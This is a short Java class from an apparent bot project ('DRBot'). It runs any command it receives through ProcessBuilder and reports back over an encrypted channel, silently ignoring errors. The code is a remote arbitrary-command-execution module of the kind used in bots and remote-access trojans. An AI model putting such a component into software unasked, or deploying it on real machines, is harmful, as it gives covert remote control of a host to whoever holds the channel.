package com.DRBot.Commands;

import com.DRBot.SecureLine.SecureLine;
import java.io.IOException;
import java.io.PrintWriter;

/**
 *
 * @author MerNat
 */
public class cmd implements Runnable{
    
    private final PrintWriter writer;
    private final String[] fullCommand;
    private String msg;
    private ProcessBuilder pB;
    private Process ps;
    private final SecureLine secureLine;
    
    public cmd(String[] command,PrintWriter writer,SecureLine secureLine){
        fullCommand = new String[command.length-1];
        for(int i = 1;i<command.length;i++){
            fullCommand[i-1] = command[i].replace("*", ":");
        }
        msg = "";
        for(String temp:fullCommand){
            msg = msg + " "+ temp;
        }
        this.writer = writer;
        this.secureLine = secureLine;
    }
    
    @Override
    public void run(){
        try
        {
            pB = new ProcessBuilder(fullCommand);
            ps = pB.start();
            this.writer.println(secureLine.encrypt("[cmd] " + msg +" is successfully executed."));
            this.writer.flush();
            ps.waitFor();
            ps.destroyForcibly();
            
        }
        catch(IOException ex){}
        catch(InterruptedException inter){}
    }
}
